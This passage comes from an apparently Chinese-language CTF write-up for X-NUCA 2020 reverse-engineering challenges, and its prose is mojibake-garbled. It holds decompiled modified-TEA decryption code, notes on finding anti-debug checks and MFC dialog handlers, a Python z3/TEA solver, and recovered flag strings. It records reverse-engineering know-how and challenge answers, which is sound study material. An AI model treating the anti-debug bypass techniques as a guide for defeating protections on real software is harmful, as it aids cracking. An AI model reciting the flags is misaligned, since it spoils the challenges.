class="line"></span><br><span class="line">ans1[<span class="number">3</span>] = <span class="number">4</span>;</span><br><span class="line">ans1[<span class="number">2</span>] = <span class="number">3</span>;</span><br><span class="line">ans1[<span class="number">1</span>] = <span class="number">2</span>;</span><br><span class="line">ans1[<span class="number">0</span>] = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line">v17 = <span class="number">0x8FF34781</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">*(_int8 *)&amp;v18 = v17 &gt;&gt; <span class="number">2</span>; <span class="comment">//LOBYTE</span></span><br><span class="line"> v19 = (((v32 &gt;&gt; <span class="number">3</span>) ^ <span class="number">16</span> * v16) + (<span class="number">4</span> * v32 ^ (v16 &gt;&gt; <span class="number">5</span>))) ^ ((*((_int32 *)ans1 + <span class="number">5</span></span><br><span class="line">                                                                       + (((<span class="keyword">unsigned</span> __int8)v18 ^ <span class="number">0xF</span>) &amp; <span class="number">3</span>)</span><br><span class="line">                                                                       - <span class="number">5</span>) ^ v16)</span><br><span class="line">                                                                    + (v32 ^ v17));</span><br><span class="line">v33 = v33-v19;</span><br><span class="line"> v16 -= (((v33 &gt;&gt; <span class="number">3</span>) ^ <span class="number">16</span> * v15) + (<span class="number">4</span> * v33 ^ (v15 &gt;&gt; <span class="number">5</span>))) ^ ((*((_int32 *)ans1 + <span class="number">5</span></span><br><span class="line">                                                                        + (((<span class="keyword">unsigned</span> __int8)v18 ^ <span class="number">0xE</span>) &amp; <span class="number">3</span>)</span><br><span class="line">                                                                        - <span class="number">5</span>) ^ v15)</span><br><span class="line">                                                                     + (v33 ^ v17));</span><br><span class="line">                                                                     </span><br><span class="line">v15 -= (((v16 &gt;&gt; <span class="number">3</span>) ^ <span class="number">16</span> * v14) + (<span class="number">4</span> * v16 ^ (v14 &gt;&gt; <span class="number">5</span>))) ^ ((*((_int32 *)ans1 + <span class="number">5</span></span><br><span class="line">                                                                        + (((<span class="keyword">unsigned</span> __int8)v18 ^ <span class="number">0xD</span>) &amp; <span class="number">3</span>)</span><br><span class="line">                                                                        - <span class="number">5</span>) ^ v14)</span><br><span class="line">                                                                     + (v16 ^ v17));</span><br><span class="line">v14 -= ((*((_int32 *)ans1 + <span class="number">5</span> + ((v17 &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>) - <span class="number">5</span>) ^ v13) + (v15 ^ v17)) ^ (((v15 &gt;&gt; <span class="number">3</span>) ^ <span class="number">16</span> * v13)</span><br><span class="line">                                                                                   + (<span class="number">4</span> * v15 ^ (v13 &gt;&gt; <span class="number">5</span>)));</span><br><span class="line">v13 -= ((*((_int32 *)ans1 + <span class="number">5</span> + (((<span class="keyword">unsigned</span> __int8)v18 ^ <span class="number">0xB</span>) &amp; <span class="number">3</span>) - <span class="number">5</span>) ^ v12) + (v14 ^ v17)) ^ (((v14 &gt;&gt; <span class="number">3</span>) ^ <span class="number">16</span> * v12) + (<span class="number">4</span> * v14 ^ (v12 &gt;&gt; <span class="number">5</span>)));</span><br><span class="line">v12 -= ((*((_int32 *)ans1 + <span class="number">5</span> + (((<span class="keyword">unsigned</span> __int8)v18 ^ <span class="number">0xA</span>) &amp; <span class="number">3</span>) - <span class="number">5</span>) ^ v11) + (v13 ^ v17)) ^ (((v13 &gt;&gt; <span class="number">3</span>) ^ <span class="number">16</span> * v11) + (<span class="number">4</span> * v13 ^ (v11 &gt;&gt; <span class="number">5</span>)));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">v11 -= ((*((_int32 *)ans1 + <span class="number">5</span> + (((<span class="keyword">unsigned</span> __int8)(v17 &gt;&gt; <span class="number">2</span>) ^ <span class="number">9</span>) &amp; <span class="number">3</span>) - <span class="number">5</span>) ^ v31) + (v12 ^ v17)) ^ (((v12 &gt;&gt; <span class="number">3</span>) ^ <span class="number">16</span> * v31) + (<span class="number">4</span> * v12 ^ (v31 &gt;&gt; <span class="number">5</span>)));<span class="comment">////</span></span><br><span class="line">v31 -= (((*((_int32 *)ans1 + <span class="number">5</span> + ((v17 &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>) - <span class="number">5</span>) ^ v30) + (v11 ^ v17)) ^ (((v11 &gt;&gt; <span class="number">3</span>) ^ <span class="number">16</span> * v30)</span><br><span class="line">                                                                                   + (<span class="number">4</span> * v11 ^ (v30 &gt;&gt; <span class="number">5</span>))));</span><br><span class="line"><span class="comment">//v18 = v31 + (((*((_int32 *)ans1 + 5 + ((v17 &gt;&gt; 2) &amp; 3) - 5) ^ v30) + (v11 ^ v17)) ^ (((v11 &gt;&gt; 3) ^ 16 * v30) + (4 * v11 ^ (v30 &gt;&gt; 5))));</span></span><br><span class="line">v30 -= ((*((_int32 *)ans1 + <span class="number">5</span> + (((<span class="keyword">unsigned</span> __int8)(v17 &gt;&gt; <span class="number">2</span>) ^ <span class="number">7</span>) &amp; <span class="number">3</span>) - <span class="number">5</span>) ^ v10) + (v31 ^ v17)) ^ (((v31 &gt;&gt; <span class="number">3</span>) ^ <span class="number">16</span> * v10) + (<span class="number">4</span> * v31 ^ (v10 &gt;&gt; <span class="number">5</span>)));</span><br><span class="line">v10 -= ((*((_int32 *)ans1 + <span class="number">5</span> + (((<span class="keyword">unsigned</span> __int8)(v17 &gt;&gt; <span class="number">2</span>) ^ <span class="number">6</span>) &amp; <span class="number">3</span>) - <span class="number">5</span>) ^ v27) + (v30 ^ v17)) ^ (((v30 &gt;&gt; <span class="number">3</span>) ^ <span class="number">16</span> * v27) + (<span class="number">4</span> * v30 ^ (v27 &gt;&gt; <span class="number">5</span>)));</span><br><span class="line">v27 -= ((*((_int32 *)ans1 + <span class="number">5</span> + (((<span class="keyword">unsigned</span> __int8)(v17 &gt;&gt; <span class="number">2</span>) ^ <span class="number">5</span>) &amp; <span class="number">3</span>) - <span class="number">5</span>) ^ v26) + (v10 ^ v17)) ^ (((v10 &gt;&gt; <span class="number">3</span>) ^ <span class="number">16</span> * v26) + (<span class="number">4</span> * v10 ^ (v26 &gt;&gt; <span class="number">5</span>)));</span><br><span class="line">v26 -= ((*((_int32 *)ans1 + <span class="number">5</span> + ((v17 &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>) - <span class="number">5</span>) ^ v29) + (v27 ^ v17)) ^ (((v27 &gt;&gt; <span class="number">3</span>) ^ <span class="number">16</span> * v29) + (<span class="number">4</span> * v27 ^ (v29 &gt;&gt; <span class="number">5</span>)));</span><br><span class="line">v29 -= ((*((_int32 *)ans1 + <span class="number">5</span> + (((<span class="keyword">unsigned</span> __int8)(v17 &gt;&gt; <span class="number">2</span>) ^ <span class="number">3</span>) &amp; <span class="number">3</span>) - <span class="number">5</span>) ^ v25) + (v26 ^ v17)) ^ (((v26 &gt;&gt; <span class="number">3</span>) ^ <span class="number">16</span> * v25) + (<span class="number">4</span> * v26 ^ (v25 &gt;&gt; <span class="number">5</span>)));</span><br><span class="line">v25 -= ((*((_int32 *)ans1 + <span class="number">5</span> + (((<span class="keyword">unsigned</span> __int8)(v17 &gt;&gt; <span class="number">2</span>) ^ <span class="number">2</span>) &amp; <span class="number">3</span>) - <span class="number">5</span>) ^ v28) + (v29 ^ v17)) ^ (((v29 &gt;&gt; <span class="number">3</span>) ^ <span class="number">16</span> * v28) + (<span class="number">4</span> * v29 ^ (v28 &gt;&gt; <span class="number">5</span>)));</span><br><span class="line">v28 -= ((*((_int32 *)ans1 + <span class="number">5</span> + (((<span class="keyword">unsigned</span> __int8)(v17 &gt;&gt; <span class="number">2</span>) ^ <span class="number">1</span>) &amp; <span class="number">3</span>) - <span class="number">5</span>) ^ v32) + (v25 ^ v17)) ^ (((v25 &gt;&gt; <span class="number">3</span>) ^ <span class="number">16</span> * v32) + (<span class="number">4</span> * v25 ^ (v32 &gt;&gt; <span class="number">5</span>)));</span><br><span class="line">v32 -= (((v28 &gt;&gt; <span class="number">3</span>) ^ <span class="number">16</span> * v33) + (<span class="number">4</span> * v28 ^ (v33 &gt;&gt; <span class="number">5</span>))) ^ ((v33 ^ *(_int32 *)(ans + <span class="number">20</span> + (v17 &amp; <span class="number">0xC</span>) - <span class="number">20</span>)) + (v28 ^ v17));</span><br><span class="line">v17 += <span class="number">0x61C88647</span>;</span><br><span class="line">&#125;<span class="keyword">while</span>(v17 != <span class="number">0</span>);</span><br><span class="line">v34++;</span><br><span class="line">&#125;<span class="keyword">while</span>(v34 != <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"good!"</span>);</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç›´æ¥é€šè¿‡è°ƒè¯•çª—å£å–å‡ºçš„è§£å¯†æ•°æ®ï¼Œç„¶åæ‰“å°å‡ºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> a[] = &#123;<span class="number">0x67616c66</span>, <span class="number">0x6330447b</span>, <span class="number">0x37306261</span>,<span class="number">0x35346146</span>, <span class="number">0x36623241</span>,</span><br><span class="line"><span class="number">0x62376646</span>, <span class="number">0x41364541</span>, <span class="number">0x41624261</span>, <span class="number">0x64354635</span>,</span><br><span class="line"><span class="number">0x43336263</span>, <span class="number">0x43446639</span>, <span class="number">0x66613545</span>, <span class="number">0x34354665</span>,</span><br><span class="line"><span class="number">0x38434144</span>, <span class="number">0x30354138</span>, <span class="number">0x7d413339</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, *(((<span class="keyword">char</span> *)&amp;a[i])+j));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//flag&#123;D0cab07Fa45A2b6Ff7bAE6AaBbA5F5dcb3C9fDCE5afeF54DAC88A5093A&#125;</span></span><br></pre></td></tr></table></figure><p>å…¶ä¸­æ˜¯sub_11E40è¿™ä¸ªå‡½æ•°å¯¹ç¨‹åºæµç¨‹è¿›è¡Œäº†ä¸€äº›éªšæ“ä½œï¼Œå¥½åƒæ˜¯hookã€‚</p><p>psï¼šåé¢çœ‹åˆ«äººçš„wpå­¦ä¹ æˆ‘æ‰çŸ¥é“è‡ªå·±é€†å‘çš„è¿™ä¸ªç®—æ³•æ˜¯ä¸€ä¸ªé­”æ”¹çš„teaï¼Œç„¶åé‚£ä¸ªéªšæ“ä½œæ˜¯hookäº†ç¨‹åºçš„memcmpå‡½æ•°ã€‚</p><h1 id="UnravelMFC"><a href="#UnravelMFC" class="headerlink" title="UnravelMFC"></a>UnravelMFC</h1><p><strong>psï¼šidaåŠ¨è°ƒæ‰“patchåçš„ç¨‹åºä¼šé—ªé€€å—ã€‚ã€‚</strong></p><p>è¿™ä¸ªé¢˜å¯¹äºæˆ‘æˆ‘ç°åœ¨çš„çŸ¥è¯†å‚¨å¤‡æ„Ÿè§‰è€ƒçš„ä¸œè¥¿è¿˜æ˜¯æŒºå¤šçš„ã€‚</p><p>é¦–å…ˆç®—æ³•ï¼šRC4ï¼Œbase64çš„ç®€å•æ”¹åŠ¨ï¼Œæ”¹äº†deltaçš„teaã€‚</p><p>ç„¶åè¯´è¯´ç¨‹åºçš„ä¸€äº›å‘ï¼Œå¼€å§‹ä½¿ç”¨å¦‚ä¸‹çš„å‡½æ•°æ‰§è¡Œä¸€ä¸ªå‡½æ•°æŒ‡é’ˆæ•°ç»„çš„æ‰€æœ‰å‡½æ•°ï¼Œé‡Œé¢åŒ…æ‹¬äº†smcï¼Œå˜æ¢æ•°æ®ï¼Œå’Œåè°ƒè¯•æ£€æµ‹(ç®€å•çš„<strong>*(_BYTE *)(__readfsdword(0x30u) + 2)</strong>ï¼‰ï¼š</p><p><img src="/2020/10/31/X-nuca-2020/image-20201212112326826.png" alt="image-20201212112326826"></p><p>å¦å¤–å°±æ˜¯ä¸€ä¸ªåè°ƒè¯•æˆ‘æ‰¾äº†å¥½ä¹…ï¼Œä¸€åº¦æ€€ç–‘æ˜¯idaç‰ˆæœ¬çš„bugï¼Œæ¯æ¬¡è°ƒè¯•åˆ°ä¸€ä¸ªåœ°æ–¹å°±é—ªé€€ï¼Œä¸€ç›´è·Ÿæœ€åè·Ÿåˆ°åº“é‡Œçš„ä¸€ä¸ªåˆ›å»ºçª—å£å‡½æ•°ï¼Œç„¶åå°±é€€å‡ºäº†ï¼Œä½†ä¸ºä»€ä¹ˆå‘¢ã€‚ã€‚åé¢æ‰å‘ç°æ˜¯åœ¨ä¸€ä¸ªå‡½æ•°åˆå§‹åŒ–çª—å£æ—¶çš„å‡½æ•°ç”¨äº†<strong>*(_BYTE *)(__readfsdword(0x30u) + 2)</strong>æ£€æµ‹è°ƒè¯•ï¼Œå¦‚æœå¤„äºè°ƒè¯•çŠ¶æ€å°±ä¸ä¼šåˆå§‹åŒ–è¿™ä¸ªçª—å£äº†ï¼Œç„¶åè°ƒç”¨ExitProcessé€€å‡ºç¨‹åºã€‚</p><p><img src="/2020/10/31/X-nuca-2020/image-20201213155507714.png" alt="image-20201213155507714"></p><p>ä»è¿™ä¸ªå‡½æ•°å‘ä¸Šæ‰¾è°ƒç”¨ï¼šå¯ä»¥çœ‹åˆ°æ¶ˆæ¯å€¼0x110ï¼Œä¸€äº›<strong>RegisterWindowsMessageW</strong>å‡½æ•°åå‡ºç°å¯¹è¯æ¡†è¿‡ç¨‹å¤„ç†å‡½æ•°ï¼ˆDialogFuncï¼‰ã€‚</p><p><img src="/2020/10/31/X-nuca-2020/image-20201213160502370.png" alt="image-20201213160502370"></p><p><img src="/2020/10/31/X-nuca-2020/image-20201213155933860.png" alt="image-20201213155933860"></p><p>æ­¤æ—¶æˆ‘åˆæƒ³åˆ°æ­£åœ¨åšçš„å¦å¤–ä¸€ä¸ªMFCç¨‹åºï¼Œé‚£æ‰¾ä¸»è¦çš„å¯¹è¯æ¡†åˆå§‹åŒ–å‡½æ•°æ˜¯ä¸æ˜¯ä¹Ÿå¯ä»¥æ‰¾å‘¢ï¼Œè¯•äº†ä¸€ä¸‹ï¼šç¡®å®å¯è¡Œã€‚</p><p><img src="/2020/10/31/X-nuca-2020/image-20201213161554990.png" alt="image-20201213161554990"></p><p>æ¥ç€ä¸Šé¢é‚£ä¸ªç”¨å‡½æ•°æŒ‡é’ˆè°ƒç”¨çš„å‡½æ•°ï¼šä¸€ä¸ªç®€å•çš„åè°ƒè¯•ï¼Œè™½ç„¶ç®€å•ï¼Œä½†æ„Ÿè§‰ä¸å¥½å‘ç°ã€‚ã€‚</p><p><img src="/2020/10/31/X-nuca-2020/image-20201212114250004.png" alt="image-20201212114250004"></p><p><img src="/2020/10/31/X-nuca-2020/image-20201212114424506.png" alt="image-20201212114424506"></p><p>ä¸Šé¢è¯´åˆ°é‚£ä¸ªåè°ƒè¯•ä¸å¥½å‘ç°ï¼Œä½†å…¶å®æœ‰ä¸€ä¸ªæŸ¥ç¨‹åºé€€å‡ºåŸå› çš„åŠæ³•ï¼Œé‚£å°±æ˜¯ä¸æ–­è·Ÿè¸ªï¼šä¸‹é¢æ˜¯é€€å‡ºå‰æˆ‘è·Ÿåˆ°çš„ä¸€ä¸ªAPIï¼š</p><p><img src="/2020/10/31/X-nuca-2020/image-20201213163744884.png" alt="image-20201213163744884"></p><p><a href="https://www.gladir.com/CODER/CWINDOWS/createdialogindirectparamw.htm" target="_blank" rel="noopener">å‡½æ•°è§£é‡Š</a>ï¼Œå…¶å®è¿™ä¸ªå‡½æ•°å°±ç±»ä¼¼DialogBoxParamA()å‡½æ•°ï¼Œç”¨å¯¹è¯æ¡†çš„æ¨¡æ¿åˆ›å»ºæ¨¡æ€å¯¹è¯æ¡†ã€‚è€Œçª—å£è¿‡ç¨‹å‡½æ•°æŒ‡é’ˆåœ¨ç¬¬å››ä¸ªå‚æ•°ã€‚ã€‚è¿™ä¹Ÿæ˜¯æˆ‘ä»¬å…³å¿ƒçš„å…³é”®å‡½æ•°ï¼Œä¸‹ä¸ªæ–­ç‚¹ã€‚</p><p><img src="/2020/10/31/X-nuca-2020/image-20201213163854906.png" alt="image-20201213163854906"></p><p>ç„¶åå°±æ˜¯ä¸ºä»€ä¹ˆç¨‹åºè¦è¾“å…¥å­—ç¬¦é•¿åº¦ä¸º66æ‰ä¼šenableç¡®å®šæŒ‰é’®ï¼Œä½†ä¸ºä»€ä¹ˆåªèƒ½è¾“å…¥63ä¸ªå­—ç¬¦å‘¢ï¼Œï¼Œè¿™ä¹Ÿæ˜¯æˆ‘åœ¨åšé¢˜æ—¶ä¸€ç›´æƒ³çš„é—®é¢˜ï¼Œç„¶åå½“æ—¶ä¹Ÿå°±ä¸æƒ³é€†ä¸‹å»äº†ã€‚</p><p>è€Œå½“æˆ‘åœ¨è¾“å…¥æ¡†è¾“å…¥æ­£ç¡®çš„flagæ—¶è¿™ä¸ªè¾“å…¥é•¿åº¦åˆå¯ä»¥æ˜¯66ï¼Œéš¾é“è¿˜æœ‰æ£€æŸ¥æœºåˆ¶ã€‚ã€‚æ‰¾äº†åŠå¤©æ²¡æœ‰æ‰¾åˆ°ï¼Œåé¢å‘ç°æ˜¯é‚£ä¸ªæ–‡æœ¬æ¡†æ˜¯æ ¹æ®æˆ‘è¾“å…¥çš„å­—ç¬¦å®½åº¦æ¥å†³å®šèƒ½è¾“å…¥å¤šå°‘å†…å®¹ã€‚ã€‚ã€‚å› ä¸ºæ¯”èµ›æ—¶æˆ‘è¾“å…¥çš„å…¨æ˜¯1ï¼Œè€Œå­—ç¬¦1æ¯”è¾ƒå®½ï¼Œè¿™é‡Œè¾“å…¥å…¨æ˜¯içš„è¯èƒ½å®¹çº³çš„å°±å¤šäº†ã€‚è¿™åº”è¯¥æ˜¯è®¾ç½®äº†è¾“å…¥æ¡†çš„ä¸€ä¸ªå±æ€§å§ã€‚</p><p><img src="/2020/10/31/X-nuca-2020/image-20201212115832156.png" alt="image-20201212115832156"></p><p>å‰©ä¸‹å¯¹äºç¨‹åºçš„å°±æ˜¯mfcæ¶ˆæ¯å¯¹åº”çš„å¤„ç†å‡½æ•°çš„å­¦ä¹ ã€‚ç„¶åé€†å‘2éƒ¨åˆ†è§£å¯†ã€‚</p><p>è¿™é‡Œåªè¯´ä¸€ä¸‹æˆ‘åœ¨pythoné€†teaåŠ å¯†æ—¶é‡åˆ°çš„å‘ï¼Œå› ä¸ºpythonä¸åƒCè¯­è¨€ï¼Œintå‹æ•°æ®çš„è¯å°±å›ºå®šæ˜¯4ä¸ªå­—èŠ‚ï¼Œpythonå°±æ˜¯ä½œä¸ºä¸€ä¸ªå¤§æ•°å¤„ç†ï¼Œæ‰€ä»¥æ¯æ¬¡çš„æ•°æ®æˆ‘ä»¬éƒ½è¦<strong>&amp;0xffffffff</strong>å–ä½4å­—èŠ‚æ•°æ®ã€‚</p><p>è§£å¯†è„šæœ¬:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line">v13, v16, v17 = BitVecs(<span class="string">'v13 v16 v17'</span>, <span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">v14 = <span class="number">0x2F9970FF</span></span><br><span class="line">v15 = <span class="number">0xDF3634AE</span></span><br><span class="line">s.add(v16 - v13 == <span class="number">0x3F66B755B4490579</span>)</span><br><span class="line">s.add(v13 + v17 == <span class="number">0x162F924623D2CAE0</span>)</span><br><span class="line">s.add(v17 - v16 == <span class="number">0x7C3C71F1B295D77F</span>)</span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> v13, v16, v17:</span><br><span class="line">print(hex(s.model()[i].as_long()))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">print(<span class="string">'usat'</span>)</span><br><span class="line"></span><br><span class="line">enc2 = [<span class="number">0x2d46347f</span>, <span class="number">0x5e79f6f4</span>, <span class="number">0xDF3634AE</span>, <span class="number">0x2F9970FF</span>, <span class="number">0x6cacebd5</span>, <span class="number">0x12c2fc6d</span>, <span class="number">0xe8e95dc6</span>, <span class="number">0xc558d3ec</span>]</span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">def delta():</span></span><br><span class="line"><span class="string">a = 0</span></span><br><span class="line"><span class="string">for i in range(32):</span></span><br><span class="line"><span class="string">a += 0x2433B95A</span></span><br><span class="line"><span class="string">a &amp;= 0xffffffff</span></span><br><span class="line"><span class="string">return a</span></span><br><span class="line"><span class="string">print(hex(delta()))</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">key = [<span class="number">0x0D9610D02</span>, <span class="number">0x2AADA57D</span>, <span class="number">0x0A37537F1</span>, <span class="number">0x0C29E3913</span>, <span class="number">0x0D5942CE8</span>, <span class="number">0x608CCE66</span>, <span class="number">0x6D593422</span>, <span class="number">0x21E5D6F2</span>, <span class="number">0x0ED3A9235</span>, <span class="number">0x9DAD62C4</span>, <span class="number">0x3856641B</span>, <span class="number">0x71F75B9D</span>, <span class="number">0x0DCDEDAE8</span>, <span class="number">0x0EAD2D1A0</span>, <span class="number">0x0BAC4F564</span>, <span class="number">0x0DA4772AC</span>]</span><br><span class="line">enc1 = [<span class="number">36</span>,  <span class="number">72</span>,  <span class="number">77</span>,  <span class="number">37</span>,  <span class="number">47</span>,  <span class="number">78</span>,  <span class="number">69</span>,  <span class="number">88</span>,  <span class="number">44</span>,  <span class="number">55</span>, </span><br><span class="line">   <span class="number">57</span>,  <span class="number">80</span>,  <span class="number">66</span>,  <span class="number">78</span>,  <span class="number">92</span>,  <span class="number">67</span>,  <span class="number">47</span>,  <span class="number">66</span>,  <span class="number">81</span>,  <span class="number">76</span>, </span><br><span class="line">   <span class="number">86</span>,  <span class="number">83</span>,  <span class="number">87</span>,  <span class="number">44</span>,  <span class="number">42</span>,  <span class="number">47</span>,  <span class="number">39</span>,  <span class="number">56</span>,  <span class="number">84</span>,  <span class="number">35</span>, </span><br><span class="line">   <span class="number">85</span>,  <span class="number">77</span>,  <span class="number">67</span>,  <span class="number">52</span>,  <span class="number">37</span>,  <span class="number">69</span>,  <span class="number">71</span>,  <span class="number">64</span>,  <span class="number">64</span>,  <span class="number">64</span>, </span><br><span class="line">   <span class="number">44</span>,  <span class="number">46</span>,  <span class="number">37</span>,  <span class="number">53</span>]</span><br><span class="line">in_put = <span class="string">'asfa2asf1asfsa13asfsfasasfas313ssljlslgjlasjlsagljlagaaslagsafsasa'</span></span><br><span class="line">a = [<span class="number">0x21</span>, <span class="number">0x5B</span>, <span class="number">0xD0</span>, <span class="number">0x3D</span>, <span class="number">0xE1</span>, <span class="number">0xE5</span>, <span class="number">0x2F</span>, <span class="number">0x7C</span>, <span class="number">0xD1</span>, <span class="number">0x79</span>, </span><br><span class="line"><span class="number">0x8E</span>, <span class="number">0x59</span>, <span class="number">0x2E</span>, <span class="number">0xAF</span>, <span class="number">0xC7</span>, <span class="number">0x88</span>, <span class="number">0x5C</span>, <span class="number">0x35</span>, <span class="number">0x25</span>, <span class="number">0xF1</span>, </span><br><span class="line"><span class="number">0x1C</span>, <span class="number">0xC8</span>, <span class="number">0x2F</span>, <span class="number">0x82</span>, <span class="number">0x97</span>, <span class="number">0x2E</span>, <span class="number">0x9C</span>, <span class="number">0xD6</span>, <span class="number">0x8A</span>, <span class="number">0x08</span>, </span><br><span class="line"><span class="number">0x48</span>, <span class="number">0xA7</span>, <span class="number">0x8D</span>]</span><br><span class="line">xor = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">33</span>):</span><br><span class="line">xor += [ord(in_put[i])^a[i]]</span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------------------1--------------------</span></span><br><span class="line">base = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(enc1)):</span><br><span class="line">enc1[i] -= <span class="number">35</span></span><br><span class="line">flag1 = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> enc1:</span><br><span class="line">flag1 += base[i]</span><br><span class="line">flag1 = base64.b64decode(flag1.encode())</span><br><span class="line">flag1 = list(flag1)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(flag1)):</span><br><span class="line">flag1[i] ^= xor[i]</span><br><span class="line">flag1 = <span class="string">''</span>.join(map(chr, flag1))</span><br><span class="line">print(flag1)</span><br><span class="line"></span><br><span class="line"><span class="comment">#----------------------------2--------------------</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">de_tea</span><span class="params">(a, b, key)</span>:</span></span><br><span class="line">sum = <span class="number">0x86772b40</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">b -= (a+sum) ^ ((a&lt;&lt;<span class="number">4</span>)+key[<span class="number">2</span>]) ^ ((a&gt;&gt;<span class="number">5</span>)+key[<span class="number">3</span>])</span><br><span class="line">b &amp;= <span class="number">0xffffffff</span></span><br><span class="line">a -= (b+sum) ^ ((b&lt;&lt;<span class="number">4</span>)+key[<span class="number">0</span>]) ^ ((b&gt;&gt;<span class="number">5</span>)+key[<span class="number">1</span>])</span><br><span class="line">a &amp;= <span class="number">0xffffffff</span></span><br><span class="line">sum -= <span class="number">0x2433B95A</span></span><br><span class="line">sum &amp;= <span class="number">0xffffffff</span></span><br><span class="line"><span class="keyword">return</span> [a, b]</span><br><span class="line">   </span><br><span class="line">ans = []</span><br><span class="line">flag2 = <span class="string">b''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(enc2), <span class="number">2</span>):</span><br><span class="line">ans += de_tea(enc2[i], enc2[i+<span class="number">1</span>], key[<span class="number">4</span>*(i//<span class="number">2</span>):])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ans:</span><br><span class="line">flag2 += long_to_bytes(i)[::<span class="number">-1</span>]</span><br><span class="line">print(flag2)</span><br><span class="line">print(flag1+<span class="string">'f'</span>+flag2.decode())</span><br></pre></td></tr></table></figure><p>æœ€åæ¶ˆæ¯æ˜ å°„è¡¨çš„ç»“æ„ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 